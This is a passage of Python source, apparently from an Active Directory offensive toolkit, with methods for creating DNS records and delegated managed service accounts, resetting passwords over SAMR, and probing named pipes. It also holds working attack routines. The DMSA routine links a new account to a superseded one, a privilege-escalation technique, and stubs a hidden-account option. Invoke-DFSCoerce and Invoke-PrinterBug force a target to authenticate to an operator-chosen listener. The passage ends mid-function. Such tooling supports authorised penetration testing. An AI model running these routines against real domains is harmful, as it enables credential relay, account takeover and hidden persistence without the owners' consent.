		record_dn = 'DC=%s,%s' % (recordname, search_base)
		node_data['dnsRecord'] = [record.getData()]
		
		succeeded = self.ldap_session.add(record_dn, ['top', 'dnsNode'], node_data)
		if not succeeded:
			logging.error(self.ldap_session.result['message'] if self.args.debug else f"[Add-DomainDNSRecord] Failed adding DNS record to domain ({self.ldap_session.result['description']})")
			return False
		else:
			logging.info('[Add-DomainDNSRecord] Success! Created new record with dn %s' % record_dn)
			return True

	def get_domaindmsa(self, identity=None, properties=None, searchbase=None, no_cache=False, no_vuln_check=False, raw=False, args=None):
		def_props = [
			'objectSid',
			'distinguishedName',
			'sAMAccountName',
			'dNSHostName',
			'msDS-ManagedAccountPrecededByLink',
			'msDS-DelegatedMSAState',
			'msDS-GroupMSAMembership',
			'msDS-AllowedToActOnBehalfOfOtherIdentity',
			'servicePrincipalName'
		]
		
		identity = args.identity if args and hasattr(args, 'identity') else identity
		properties = args.properties if args and hasattr(args, 'properties') else properties
		if properties is None:
			properties = def_props
		searchbase = args.searchbase if args and hasattr(args, 'searchbase') else searchbase
		no_cache = args.no_cache if args and hasattr(args, 'no_cache') else no_cache
		no_vuln_check = args.no_vuln_check if args and hasattr(args, 'no_vuln_check') else no_vuln_check
		raw = args.raw if args and hasattr(args, 'raw') else raw

		entries = self.get_domainobject(
			identity=identity, 
			properties=properties,
			ldap_filter="(objectClass=msDS-DelegatedManagedServiceAccount)",
			searchbase=searchbase, 
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)
		for entry in entries:
			if entry.get("attributes",{}).get("msDS-GroupMSAMembership"):
				entry["attributes"]["msDS-GroupMSAMembership"] = self.convertfrom_sid(entry["attributes"]["msDS-GroupMSAMembership"])
			if entry.get("attributes",{}).get("msDS-AllowedToActOnBehalfOfOtherIdentity"):
				entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"] = self.convertfrom_sid(entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"])
		logging.debug(f"[Get-DomainDMSA] Found {len(entries)} object(s) with dmsa attribute")
		return entries

	def add_domaindmsa(self, identity=None, supersededaccount=None, principals_allowed_to_retrieve_managed_password=None, dnshostname=None, hidden=False, basedn=None, args=None):
		identity = args.identity if args and hasattr(args, 'identity') else identity
		supersededaccount = args.supersededaccount if args and hasattr(args, 'supersededaccount') else supersededaccount
		principals_allowed_to_retrieve_managed_password = args.principals_allowed_to_retrieve_managed_password if args and hasattr(args, 'principals_allowed_to_retrieve_managed_password') else principals_allowed_to_retrieve_managed_password
		dnshostname = args.dnshostname if args and hasattr(args, 'dnshostname') and args.dnshostname else dnshostname
		hidden = args.hidden if args and hasattr(args, 'hidden') else hidden
		basedn = args.basedn if args and hasattr(args, 'basedn') else basedn
		whitelisted_sids = ["S-1-1-0"]

		if not identity:
			raise ValueError("[Add-DomainDMSA] -Identity is required")
		
		parent_dn_entries = f"CN=Managed Service Accounts,{self.root_dn}"
		if basedn:
			if is_dn(basedn):
				parent_dn_entries = basedn
			else:
				logging.warning(f"[Add-DomainDMSA] Invalid basedn format: {basedn}")
				return False
		
		try:
			dmsa_attrs = {
				'objectClass': [
					'msDS-DelegatedManagedServiceAccount'
				],
				'objectCategory': f'CN=ms-DS-Delegated-Managed-Service-Account,{self.schema_dn}',
				'sAMAccountName': f"{identity}$" if not identity.endswith('$') else identity,
				'cn': identity,
				'userAccountControl': 4096,  # WORKSTATION_TRUST_ACCOUNT
				'dNSHostName': f"{identity}.{self.conn.get_domain()}" if not dnshostname else dnshostname,
				'msDS-SupportedEncryptionTypes': 28, # RC4-HMAC,AES128,AES256
				'msDS-ManagedPasswordInterval': 30,
				'msDS-DelegatedMSAState': DMSA_DELEGATED_MSA_STATE.DISABLED.value
			}
			
			if principals_allowed_to_retrieve_managed_password:
				principal_entries = self.get_domainobject(
					identity=principals_allowed_to_retrieve_managed_password,
					properties=['objectSid']
				)
			
				if len(principal_entries) == 0:
					logging.error(f"[Add-DomainDMSA] Principal {principals_allowed_to_retrieve_managed_password} not found")
					return False
				elif len(principal_entries) > 1:
					logging.error(f"[Add-DomainDMSA] More than one principal {principals_allowed_to_retrieve_managed_password} found")
					return False
					
				principal_sid = principal_entries[0].get("attributes", {}).get("objectSid")
				if not principal_sid:
					logging.error(f"[Add-DomainDMSA] Principal {principals_allowed_to_retrieve_managed_password} has no objectSid")
					return False
				whitelisted_sids.append(principal_sid)
				msa_membership = MSA.create_msamembership(principal_sid)
				dmsa_attrs['msDS-GroupMSAMembership'] = msa_membership

			if supersededaccount:
				if not is_dn(supersededaccount):
					logging.debug(f"[Add-DomainDMSA] Superseded account {supersededaccount} is not a DN, searching for it")
					target = self.get_domainobject(identity=supersededaccount, properties=['distinguishedName'])
					if len(target) == 0:
						logging.error(f"[Add-DomainDMSA] Superseded account {supersededaccount} not found")
						return False
					elif len(target) > 1:
						logging.error(f"[Add-DomainDMSA] More than one superseded account {supersededaccount} found")
						return False
					else:
						superseded_dn = target[0].get("attributes", {}).get("distinguishedName")
						if not superseded_dn:
							logging.error(f"[Add-DomainDMSA] Superseded account {supersededaccount} has no distinguished name")
							return False
						else:
							logging.debug(f"[Add-DomainDMSA] Found superseded account {superseded_dn}")
				else:
					superseded_dn = supersededaccount
				dmsa_attrs['msDS-ManagedAccountPrecededByLink'] = superseded_dn
				dmsa_attrs['msDS-DelegatedMSAState'] = DMSA_DELEGATED_MSA_STATE.MIGRATED.value

			dmsa_dn = f"CN={identity},{parent_dn_entries}"
			logging.debug(f"[Add-DomainDMSA] Creating DMSA account at {dmsa_dn}")
			for attr in dmsa_attrs:
				logging.debug(f"{attr}:{dmsa_attrs[attr]}")
				
			result = self.ldap_session.add(
				dmsa_dn, 
				None,  
				dmsa_attrs
			)

			if not result:
				logging.error(f"[Add-DomainDMSA] Failed to create DMSA: {self.ldap_session.result}")
				return False
			
			logging.info(f"[Add-DomainDMSA] Successfully created DMSA account {identity}")
			
			if hidden:
				raise NotImplementedError("[Add-DomainDMSA] Hidden DMSA accounts are not supported yet")
				username = self.whoami.split('\\')[1] if "\\" in self.whoami else self.whoami
				entries = self.get_domainobject(identity=username, properties=['objectSid'])
				if len(entries) == 0:
					logging.error(f"[Add-DomainDMSA] Current user {username} not found")
					return False
				elif len(entries) > 1:
					logging.error(f"[Add-DomainDMSA] More than one current user {username} found")
					return False
				current_user_sid = entries[0].get("attributes", {}).get("objectSid")
				
				if not current_user_sid:
					logging.error(f"[Add-DomainDMSA] Current user {username} has no objectSid")
					return False

				entries = self.get_domainobject(identity=dmsa_dn, properties=['ntSecurityDescriptor'], sd_flag=0x05)
				if len(entries) == 0:
					logging.error(f"[Add-DomainDMSA] DMSA account {dmsa_dn} not found")
					return False
				elif len(entries) > 1:
					logging.error(f"[Add-DomainDMSA] More than one DMSA account {dmsa_dn} found")
					return False
				sec_desc = entries[0].get("attributes", {}).get("ntSecurityDescriptor")
				
				if isinstance(sec_desc, list):
					sec_desc = sec_desc[0]
				elif isinstance(sec_desc, str):
					sec_desc = sec_desc.encode('utf-8')

				if not sec_desc:
					logging.error(f"[Add-DomainDMSA] DMSA account {dmsa_dn} has no ntSecurityDescriptor")
					return False

				whitelisted_sids.append(current_user_sid)
				new_sec_desc = MSA.set_hidden_secdesc(
					sec_desc=sec_desc,
					whitelisted_sids=whitelisted_sids
				)

				succeeded = self.ldap_session.modify(dmsa_dn, {'ntSecurityDescriptor': [(ldap3.MODIFY_REPLACE, [new_sec_desc])]})
				if not succeeded:
					logging.error(f"[Add-DomainDMSA] Failed to set hidden DMSA account {dmsa_dn}")
					return False
				else:
					logging.info(f"[Add-DomainDMSA] Successfully set hidden DMSA account {dmsa_dn}")

			return True
		except Exception as e:
			if self.args.stack_trace:
				raise e
			logging.error(f"[Add-DomainDMSA] Error creating DMSA: {str(e)}")
			return False

	def remove_domaindmsa(self, identity=None, searchbase=None, args=None):
		identity = args.identity if args and hasattr(args, 'identity') else identity
		searchbase = args.searchbase if args and hasattr(args, 'searchbase') else searchbase
		if not identity:
			raise ValueError("[Remove-DomainDMSA] -Identity is required")

		if not is_dn(identity):
			logging.debug(f"[Remove-DomainDMSA] DMSA account {identity} is not a DN, searching for it")
			entries = self.get_domaindmsa(
				identity=identity, 
				properties = ['objectSid','distinguishedName'],
				searchbase=searchbase,
				no_cache=True
			)
			if len(entries) == 0:
				logging.error(f"[Remove-DomainDMSA] DMSA account {identity} not found")
				return False
			elif len(entries) > 1:
				logging.error(f"[Remove-DomainDMSA] More than one DMSA account {identity} found")
				return False
			entry_dn = entries[0].get("attributes", {}).get("distinguishedName")
		else:
			entry_dn = identity

		if not entry_dn:
			logging.error(f"[Remove-DomainDMSA] DMSA account {identity} has no distinguished name")
			return False

		logging.warning(f"[Remove-DomainDMSA] Removing DMSA account {identity}")
		succeeded = self.ldap_session.delete(entry_dn)
		if not succeeded:
			logging.error(f"[Remove-DomainDMSA] Failed to remove DMSA account {identity}")
			return False
		
		logging.info(f"[Remove-DomainDMSA] Successfully removed DMSA account {identity}")
		return True

	def add_domaincomputer(self, computer_name=None, computer_pass=None, no_password=False, basedn=None, args=None):
		computer_name = args.computername if args and hasattr(args, 'computername') else computer_name
		computer_pass = args.computerpass if args and hasattr(args, 'computerpass') else computer_pass
		no_password = args.no_password if args and hasattr(args, 'no_password') else no_password
		
		parent_dn_entries = f"CN=Computers,{self.root_dn}"
		if basedn:
			parent_dn_entries = basedn
		if hasattr(args, 'basedn') and args.basedn:
			entries = self.get_domainobject(identity=args.basedn)
			if len(entries) <= 0:
				logging.error(f"[Add-DomainComputer] {args.basedn} could not be found in the domain")
				return
			elif len(entries) > 1:
				logging.error("[Add-DomainComputer] More then one computer found in domain")
				return

			parent_dn_entries = entries[0]["attributes"]["distinguishedName"]
		
		if computer_name[-1] != '$':
			computer_name += '$'

		setattr(self.args, "TGT", self.conn.get_TGT())
		setattr(self.args, "TGS", self.conn.get_TGS())
		setattr(self.args, "dc_host", self.dc_dnshostname)
		setattr(self.args, "delete", False)

		if self.ssl:
			setattr(self.args, "method", "LDAPS")
		else:
			setattr(self.args, "method", "SAMR")

		# Creating Machine Account
		addmachineaccount = ADDCOMPUTER(
				username=self.username,
				password=self.password,
				domain=self.domain,
				cmdLineOptions = self.args,
				computer_name = computer_name,
				computer_pass = computer_pass,
				no_password = no_password,
				base_dn = parent_dn_entries,
				ldap_session = self.ldap_session
		)
		try:
			if self.ssl:
				logging.debug("[Add-DomainComputer] Adding computer via LDAPS")
				addmachineaccount.run_ldaps()
			else:
				logging.debug("[Add-DomainComputer] Adding computer via SAMR")
				addmachineaccount.run_samr()
		except Exception as e:
			logging.error(str(e))
			return False

		if self.get_domainobject(identity=computer_name, properties=['distinguishedName'])[0]['attributes']['distinguishedName']:
			return True
		else:
			return False

	def get_namedpipes(self, args=None, timeout=5, max_threads=10):
		"""
		Get named pipes from a target computer using parallel processing
		
		Args:
			args: Command line arguments
			timeout: Connection timeout in seconds (default: 5)
			max_threads: Maximum number of concurrent threads to use (default: 10)
			
		Returns:
			List of dictionaries containing pipe information
		"""
		import concurrent.futures
		import time
		
		host = ""
		host_inp = args.computer if args and hasattr(args, 'computer') and args.computer else (args.computername if args and hasattr(args, 'computername') else None)
		host = self._resolve_host(host_inp, getattr(args, 'server', None) if args else None)

		if not host:
			logging.error('[Get-NamedPipes] Host not found')
			return

		entries = []
		binding_params = {
				'lsarpc': {
					'stringBinding': r'ncacn_np:%s[\PIPE\lsarpc]' % host,
					'protocol': 'MS-LSAD/MS-LSAT',
					'description': 'Local Security Authority (LSA) Remote Protocol',
					},
				'efsr': {
					'stringBinding': r'ncacn_np:%s[\PIPE\efsrpc]' % host,
					'protocol': 'MS-EFSR',
					'description': 'Encrypting File System Remote (EFSRPC) Protocol',
					},
				'samr': {
					'stringBinding': r'ncacn_np:%s[\PIPE\samr]' % host,
					'protocol': 'MS-SAMR',
					'description': 'Security Account Manager (SAM) Remote Protocol',
					},
				'lsass': {
					'stringBinding': r'ncacn_np:%s[\PIPE\lsass]' % host,
					'protocol': 'N/A',
					'description': 'N/A',
					},
				'netlogon': {
					'stringBinding': r'ncacn_np:%s[\PIPE\netlogon]' % host,
					'protocol': 'MS-NRPC',
					'description': 'Netlogon Remote Protocol',
					},
				'spoolss': {
					'stringBinding': r'ncacn_np:%s[\PIPE\spoolss]' % host,
					'protocol': 'MS-RPRN',
					'description': 'Print System Remote Protocol',
					},
				'DAV RPC SERVICE': {
					'stringBinding': r'ncacn_np:%s[\PIPE\DAV RPC SERVICE]' % host,
					'protocol': 'WebClient',
					'description': 'WebDAV WebClient Service',
					},
				'netdfs': {
					'stringBinding': r'ncacn_np:%s[\PIPE\netdfs]' % host,
					'protocol': 'MS-DFSNM',
					'description': 'Distributed File System (DFS)',
					},
				'atsvc': {
					'stringBinding': r'ncacn_np:%s[\PIPE\atsvc]' % host,
					'protocol': 'ATSvc',
					'description': 'Microsoft AT-Scheduler Service',
					},
				}
		
		# Create a cache for pipe check results to avoid duplicate checks
		pipe_check_cache = {}
		
		def check_pipe(pipe_name):
			"""Helper function to check a single pipe with timeout and caching"""
			start_time = time.time()
			
			# Create a unique entry for each check
			entry = {
				"Name": pipe_name,
				"Protocol": binding_params[pipe_name]['protocol'],
				"Description": binding_params[pipe_name]['description'],
				"Authenticated": None
			}
			
			# Check if we have this result cached
			if pipe_name in pipe_check_cache:
				entry["Authenticated"] = pipe_check_cache[pipe_name]
				return {"attributes": dict(entry)}
			
			# First try unauthenticated
			auth_required = True
			conn_result = self.conn.connectRPCTransport(
				host=host, 
				stringBindings=binding_params[pipe_name]['stringBinding'], 
				auth=False, 
				set_authn=True
			)
			
			if conn_result:
				# No authentication required
				entry["Authenticated"] = f'{bcolors.WARNING}No{bcolors.ENDC}'
				auth_required = False
				pipe_check_cache[pipe_name] = entry["Authenticated"]
			
			# If first attempt failed, try authenticated
			if auth_required:
				conn_result = self.conn.connectRPCTransport(
					host=host, 
					stringBindings=binding_params[pipe_name]['stringBinding'], 
					set_authn=True
				)
				
				if conn_result:
					entry["Authenticated"] = f'{bcolors.OKGREEN}Yes{bcolors.ENDC}'
					pipe_check_cache[pipe_name] = entry["Authenticated"]
				else:
					# Pipe not accessible or doesn't exist
					return None
			
			if time.time() - start_time > timeout:
				logging.debug(f"[Get-NamedPipes] Pipe check for {pipe_name} timed out after {timeout} seconds")
			
			return {"attributes": dict(entry)}
		
		# If checking a specific pipe
		if args.name:
			if args.name in list(binding_params.keys()):
				result = check_pipe(args.name)
				if result:
					entries.append(result)
			else:
				logging.error("[Get-NamedPipes] Pipe not found")
				return
		else:
			# Process all pipes in parallel
			with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
				# Submit all pipe checks
				future_to_pipe = {executor.submit(check_pipe, pipe): pipe for pipe in binding_params.keys()}
				
				# Process results as they complete
				for future in concurrent.futures.as_completed(future_to_pipe):
					pipe = future_to_pipe[future]
					try:
						result = future.result()
						if result:
							entries.append(result)
					except Exception as exc:
						logging.debug(f"[Get-NamedPipes] Pipe {pipe} check failed with: {exc}")

		return entries

	def set_domainuserpassword(self, identity, accountpassword, oldpassword=None, args=None):
		entries = self.get_domainuser(identity=identity, properties=['distinguishedName','sAMAccountName'])
		if len(entries) == 0:
			logging.error(f'[Set-DomainUserPassword] No principal object found in domain')
			return
		elif len(entries) > 1:
			logging.error(f'[Set-DomainUserPassword] Multiple principal objects found in domain. Use specific identifier')
			return
		logging.info(f'[Set-DomainUserPassword] Principal {"".join(entries[0]["attributes"]["distinguishedName"])} found in domain')
		
		if self.conn.use_ldaps:
			logging.debug("[Set-DomainUserPassword] Using LDAPS to change %s password" % (entries[0]["attributes"]["sAMAccountName"]))
			succeed = modifyPassword.ad_modify_password(self.ldap_session, entries[0]["attributes"]["distinguishedName"], accountpassword, old_password=oldpassword)
			if succeed:
				logging.info(f'[Set-DomainUserPassword] Password has been successfully changed for user {"".join(entries[0]["attributes"]["sAMAccountName"])}')
				return True
			else:
				logging.error(f'[Set-DomainUserPassword] Failed to change password for {"".join(entries[0]["attributes"]["sAMAccountName"])}')
				return False
		else:
			logging.debug("[Set-DomainUserPassword] Using SAMR to change %s password" % (entries[0]["attributes"]["sAMAccountName"]))
			try:
				dce = self.conn.init_samr_session()
				if not dce:
					logging.error('[Set-DomainUserPassword] Error binding with SAMR')
					return

				server_handle = samr.hSamrConnect(dce, self.dc_ip + '\x00')['ServerHandle']
				domainSID = samr.hSamrLookupDomainInSamServer(dce, server_handle, self.domain)['DomainId']
				domain_handle = samr.hSamrOpenDomain(dce, server_handle, domainId=domainSID)['DomainHandle']
				userRID = samr.hSamrLookupNamesInDomain(dce, domain_handle, (entries[0]['attributes']['sAMAccountName'],))['RelativeIds']['Element'][0]
				opened_user = samr.hSamrOpenUser(dce, domain_handle, userId=userRID)

				req = samr.SamrSetInformationUser2()
				req['UserHandle'] = opened_user['UserHandle']
				req['UserInformationClass'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
				req['Buffer'] = samr.SAMPR_USER_INFO_BUFFER()
				req['Buffer']['tag'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
				req['Buffer']['Internal5']['UserPassword'] = cryptPassword(b'SystemLibraryDTC', accountpassword)
				req['Buffer']['Internal5']['PasswordExpired'] = 0

				resp = dce.request(req)
				logging.info(f'[Set-DomainUserPassword] Password has been successfully changed for user {"".join(entries[0]["attributes"]["sAMAccountName"])}')
				return True
			except:
				logging.error(f'[Set-DomainUserPassword] Failed to change password for {"".join(entries[0]["attributes"]["sAMAccountName"])}')
				return False

	def set_domaincomputerpassword(self, identity, accountpassword, oldpassword=None, args=None):
		entries = self.get_domaincomputer(identity=identity, properties=[
			'distinguishedName',
			'sAMAccountName',
			])
		if len(entries) == 0:
			logging.error("[Get-DomainComputerPassword] Computer %s not found in domain" % (identity))
			return False
		elif len(entries) > 1:
			logging.error("[Get-DomainComputerPassword] Multiple computers found in domain")
			return False

		if self.conn.use_ldaps:
			logging.debug("[Set-DomainComputerPassword] Using LDAPS to change %s password" % (entries[0]["attributes"]["sAMAccountName"]))
			succeed = modifyPassword.ad_modify_password(self.ldap_session, entries[0]["attributes"]["distinguishedName"], accountpassword, old_password=oldpassword)
			if succeed:
				logging.info(f'[Set-DomainComputerPassword] Password has been successfully changed for user {entries[0]["attributes"]["sAMAccountName"]}')
				return True
			else:
				logging.error(f'[Set-DomainComputerPassword] Failed to change password for {entries[0]["attributes"]["sAMAccountName"]}')
				return False
		else:
			logging.debug("[Set-DomainComputerPassword] Using SAMR to change %s password" % (entries[0]["attributes"]["sAMAccountName"]))
			try:
				dce = self.conn.init_samr_session()
				if not dce:
					logging.error('Error binding with SAMR')
					return

				server_handle = samr.hSamrConnect(dce, self.dc_ip + '\x00')['ServerHandle']
				domainSID = samr.hSamrLookupDomainInSamServer(dce, server_handle, self.domain)['DomainId']
				domain_handle = samr.hSamrOpenDomain(dce, server_handle, domainId=domainSID)['DomainHandle']
				userRID = samr.hSamrLookupNamesInDomain(dce, domain_handle, (entries[0]['attributes']['sAMAccountName'],))['RelativeIds']['Element'][0]
				opened_user = samr.hSamrOpenUser(dce, domain_handle, userId=userRID)

				req = samr.SamrSetInformationUser2()
				req['UserHandle'] = opened_user['UserHandle']
				req['UserInformationClass'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
				req['Buffer'] = samr.SAMPR_USER_INFO_BUFFER()
				req['Buffer']['tag'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
				req['Buffer']['Internal5']['UserPassword'] = cryptPassword(b'SystemLibraryDTC', accountpassword)
				req['Buffer']['Internal5']['PasswordExpired'] = 0

				resp = dce.request(req)
				logging.info(f'[Set-DomainComputerPassword] Password has been successfully changed for user {"".join(entries[0]["attributes"]["sAMAccountName"])}')
				return True
			except:
				logging.error(f'[Set-DomainComputerPassword] Failed to change password for {"".join(entries[0]["attributes"]["sAMAccountName"])}')
				return False


	def set_domainobject(self, identity, clear=None, _set=None, append=None, remove=None, searchbase=None, sd_flag=None, args=None):
		operations = [op for op in [_set, clear, append, remove] if op]
		if len(operations) > 1:
			raise ValueError(f"Cannot use multiple operations simultaneously: {', '.join([op_name for op_name, op in zip(['set', 'clear', 'append', 'remove'], [_set, clear, append, remove]) if op])}. Choose one operation.")

		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn

		operation = ldap3.MODIFY_REPLACE
		attr_clear = args.clear if hasattr(args,'clear') and args.clear else clear
		attr_set = args.set if hasattr(args, 'set') and args.set else _set
		attr_append = args.append if hasattr(args, 'append') and args.append else append
		attr_remove = args.remove if hasattr(args, 'remove') and args.remove else remove
		attr_key = ""
		attr_val = []

		if attr_clear:
			attr_key = attr_clear

			targetobject = self.get_domainobject(identity=identity, searchbase=searchbase, properties=[attr_clear, "distinguishedName"], sd_flag=sd_flag)
			if len(targetobject) > 1:
				logging.error(f"[Set-DomainObject] More than one identity found. Use distinguishedName instead")
				return False
			elif len(targetobject) == 0:
				logging.error(f"[Set-DomainObject] Identity {identity} not found in domain")
				return False
		elif attr_remove:
			operation = ldap3.MODIFY_DELETE
			attrs = {}

			if isinstance(attr_remove, dict):
				attrs = attr_remove
			else:
				attrs = ini_to_dict(attr_remove)
			
			if not attrs:
				raise ValueError(f"[Set-DomainObject] Parsing {'-Remove' if args.remove else '-Clear'} value failed")
			
			targetobject = self.get_domainobject(identity=identity, searchbase=searchbase, properties=[attrs['attribute'], "distinguishedName"], sd_flag=sd_flag)
			if len(targetobject) > 1:
				logging.error(f"[Set-DomainObject] More than one identity found. Use distinguishedName instead")
				return False
			elif len(targetobject) == 0:
				logging.error(f"[Set-DomainObject] Identity {identity} not found in domain")
				return False
			
			# check if value is a file
			if len(attrs['value']) == 1 and isinstance(attrs['value'][0], str) and not isinstance(attrs['value'][0], bytes) and attrs['value'][0].startswith("@"):
				path = attrs['value'][0].lstrip("@")
				try:
					logging.debug("[Set-DomainObject] Reading from file")
					attrs['value'][0] = read_file(path, mode ="rb")
				except Exception as e:
					logging.error("[Set-DomainObject] %s" % str(e))
					return

			attr_key = attrs['attribute']
			attr_val = attrs['value']
		else:
			attrs = {}

			if attr_set:
				if isinstance(attr_set, dict):
					attrs = attr_set
				else:
					attrs = ini_to_dict(attr_set)
			elif attr_append:
				if isinstance(attr_append, dict):
					attrs = attr_append
				else:
					attrs = ini_to_dict(attr_append)

			if not attrs:
				raise ValueError(f"[Set-DomainObject] Parsing {'-Set' if args.set else '-Append'} value failed")
			targetobject = self.get_domainobject(identity=identity, searchbase=searchbase, properties=[attrs['attribute'], "distinguishedName"], sd_flag=sd_flag, no_cache=True)
			if len(targetobject) > 1:
				logging.error(f"[Set-DomainObject] More than one identity found. Use distinguishedName instead")
				return False
			elif len(targetobject) == 0:
				logging.error(f"[Set-DomainObject] Identity {identity} not found in domain")
				return False

			# check if value is a file
			if isinstance(attrs['value'], list) and len(attrs['value']) == 1 and isinstance(attrs['value'][0], str) and not isinstance(attrs['value'][0], bytes) and attrs['value'][0].startswith("@"):
				path = attrs['value'][0].lstrip("@")
				try:
					logging.debug("[Set-DomainObject] Reading from file")
					attrs['value'][0] = read_file(path, mode ="rb")
				except Exception as e:
					logging.error("[Set-DomainObject] %s" % str(e))
					return

			if attr_append:
				if not targetobject[0]["attributes"].get(attrs['attribute']):
					logging.warning(f"[Set-DomainObject] {attrs['attribute']} property not found in target identity")
					logging.warning(f"[Set-DomainObject] Attempting to force add attribute {attrs['attribute']} to target object")
					return self.set_domainobject(identity, 
												_set={
													'attribute': attrs['attribute'],
													'value': attrs['value'],
												},
												searchbase=searchbase,
												sd_flag=sd_flag
												)

				temp_list = []
				if isinstance(targetobject[0]["attributes"][attrs['attribute']], str):
					if len(targetobject[0]["attributes"][attrs['attribute']].strip()) != 0:
						temp_list.append(targetobject[0]["attributes"][attrs['attribute']])
				elif isinstance(targetobject[0]["attributes"][attrs['attribute']], int):
					temp_list.append(targetobject[0]["attributes"][attrs['attribute']])
				elif isinstance(targetobject[0]["attributes"][attrs['attribute']], list):
					temp_list = targetobject[0]["attributes"][attrs['attribute']]

				#In case the value a Distinguished Name we retransform it into a list to append it
				if is_dn(str(attrs['value'])):
					attrs['value'] = list(set(list(attrs['value'].split('\n') + temp_list)))
				else:
					attrs['value'] = list(set(attrs['value'] + temp_list))
			elif attr_set:
				#In case the value is a Distinguished Name
				if not is_dn(str(attrs['value'])):
					if isinstance(attrs['value'], int):
						attrs['value'] = [attrs['value']]
					else:
						attrs['value'] = list(set(attrs['value']))

			attr_key = attrs['attribute']
			attr_val = attrs['value']
		
		# if the attribute is a UAC flag and check if not a digit, we need to convert the value to a numeric value
		if attr_key and attr_key.lower() == 'useraccountcontrol' and attr_val:
			if isinstance(attr_val, list):
				if len(attr_val) > 0 and not isinstance(attr_val[0], int) and not (isinstance(attr_val[0], str) and attr_val[0].isdigit()):
					attr_val = UAC.parse_uac_namestrings_to_value(attr_val)
			else:
				if not isinstance(attr_val, int) and not (isinstance(attr_val, str) and attr_val.isdigit()):
					attr_val = UAC.parse_uac_namestrings_to_value(attr_val)

		succeeded = self.ldap_session.modify(targetobject[0]["attributes"]["distinguishedName"], {
											 attr_key:[
												(operation,attr_val)
											 ]
											}, controls=security_descriptor_control(sdflags=sd_flag) if sd_flag else None)

		if not succeeded:
			logging.error(f"[Set-DomainObject] Failed to modify attribute {attr_key} for {targetobject[0]['attributes']['distinguishedName']}")
		else:
			logging.info(f'[Set-DomainObject] Success! modified attribute {attr_key} for {targetobject[0]["attributes"]["distinguishedName"]}')

		return succeeded

	def set_domainobjectdn(self, identity, destination_dn, searchbase=None, sd_flag=None, args=None):
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn

		# verify if the identity exists
		targetobject = self.get_domainobject(identity=identity, searchbase=searchbase, properties=['distinguishedName'], sd_flag=sd_flag)
		if len(targetobject) > 1:
			logging.error(f"[Set-DomainObjectDN] More than one {identity} object found in domain. Try using distinguishedName instead")
			return False
		elif len(targetobject) == 0:
			logging.error(f"[Set-DomainObjectDN] {identity} not found in domain")
			return False

		# verify if the destination_dn exists
		new_dn = self.get_domainobject(identity=destination_dn, searchbase=searchbase, properties=['distinguishedName'])
		if not new_dn:
			logging.error(f"[Set-DomainObjectDN] Object {destination_dn} not found in domain")
			return False
		
		# set the object new dn
		if isinstance(targetobject, list):
			targetobject_dn = targetobject[0]["attributes"]["distinguishedName"]
		else:
			targetobject_dn = targetobject["attributes"]["distinguishedName"]

		logging.debug(f"[Set-DomainObjectDN] Modifying {targetobject_dn} object dn to {destination_dn}")

		relative_dn = targetobject_dn.split(",")[0]

		succeeded = self.ldap_session.modify_dn(targetobject_dn, relative_dn, new_superior=destination_dn)
		if not succeeded:
			logging.error(self.ldap_session.result['message'] if self.args.debug else f"[Set-DomainObjectDN] Failed to modify, view debug message with --debug")
		else:
			logging.info(f'[Set-DomainObject] Success! modified new dn for {targetobject_dn}')

		return succeeded

	def invoke_dfscoerce(self, target=None, listener=None, args=None):
		entry = {}
		target = target if target else (args.target if args else None)
		target = self._resolve_host(target)
		if not target:
			return
		listener = listener if listener else (args.listener if args else None)

		if not listener:
			logging.error("[Invoke-DFSCoerce] Listener IP is required")
			return
			
		if not target:
			logging.error("[Invoke-DFSCoerce] Target domain is required")
			return

		entry['attributes'] = {
			'Target': target,
			'Listener': listener,
		}
			
		stringBinding = f"ncacn_np:{target}[\\pipe\\netdfs]"
		dce = self.conn.connectRPCTransport(host=target, stringBindings=stringBinding, interface_uuid=MSRPC_UUID_DFSNM)

		if dce is None:
			logging.error("[Invoke-DFSCoerce] Failed to connect to %s" % (target))
			return

		logging.debug("[Invoke-DFSCoerce] Connected to %s" % (target))

		try:
			request = NetrDfsRemoveStdRoot()
			request['ServerName'] = '%s\x00' % listener
			request['RootShare'] = 'test\x00'
			request['ApiFlags'] = 1
			if self.args.stack_trace:
				request.dump()
			resp = dce.request(request)
		except Exception as e:
			entry['attributes']['Status'] = 'Might work?'
			entry['attributes']['Response'] = str(e)
			logging.error("[Invoke-DFSCoerce] %s" % (str(e)))
			return [entry]
		
		logging.debug("[Invoke-DFSCoerce] Triggered RPC backconnect, this may or may not have worked")
		logging.debug("[Invoke-DFSCoerce] Disconnecting from %s" % (target))
		dce.disconnect()

		entry['attributes']['Status'] = 'Success'
		return [entry]

	def invoke_printerbug(self, target=None, listener=None, args=None):
		# https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
		entry = {}
		target = target if target else (args.target if args else None)
		target = self._resolve_host(target)
		if not target:
			return
		listener = listener if listener else (args.listener if args else None)

		if not listener:
			logging.error("[Invoke-PrinterBug] Listener IP [-Listener] is required")
			return
			
		if not target:
			logging.error("[Invoke-PrinterBug] Target domain [-Target] is required")
			return
		
		entry['attributes'] = {
			'Target': target,
			'Listener': listener,
		}
			
		stringBinding = f"ncacn_np:{target}[\\pipe\\spoolss]"
		dce = self.conn.connectRPCTransport(host=target, stringBindings=stringBinding, interface_uuid = rprn.MSRPC_UUID_RPRN)

		if dce is None:
			logging.error("[Invoke-PrinterBug] Failed to connect to %s" % (target))
			return
			
		logging.debug("[Invoke-PrinterBug] Connected to %s" % (target))

		try:
			resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % target)
		except Exception as e:
			entry['attributes']['Status'] = 'Failed'
			if str(e).find('Broken pipe') >= 0:
				logging.error('[Invoke-PrinterBug] Connection failed - skipping host!')
				return [entry]
			elif str(e).upper().find('ACCESS_DENIED'):
				logging.error('[Invoke-PrinterBug] Access denied - RPC call was denied')
				dce.disconnect()
				return [entry]
			else:
				logging.error('[Invoke-PrinterBug] %s' % (str(e)))
				return [entry]

		if resp:
